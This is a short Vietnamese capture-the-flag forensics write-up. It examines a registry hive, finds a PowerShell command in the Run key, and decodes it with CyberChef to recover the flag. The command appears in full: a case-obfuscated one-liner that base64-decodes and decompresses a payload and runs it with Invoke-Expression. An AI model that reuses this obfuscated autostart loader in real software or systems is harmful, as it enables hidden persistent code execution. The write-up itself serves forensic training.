Đề cho một file `NTUSER.DAT`, mở file xem thì thấy là một file registry
![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20200108.png)

Sử dụng tool RegistryExplorer để mở tệp. Mình load hive và tìm đến path `Software\Microsoft\Windows\CurrentVersion\Run` để các câu lệnh được thực thi

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20200634.png)

Đây là đoạn script trong value

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon
```
Đọc qua thì thấy câu lệnh trên giải mã base64 và deflate chuỗi trên rồi thực thi câu lệnh sau khi giải mã. Mình dùng Cyberchef để làm tương tự 

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20201249.png)

Tìm được Flag: `CHH{N0_4_go_n0_st4r_wh3r3}`


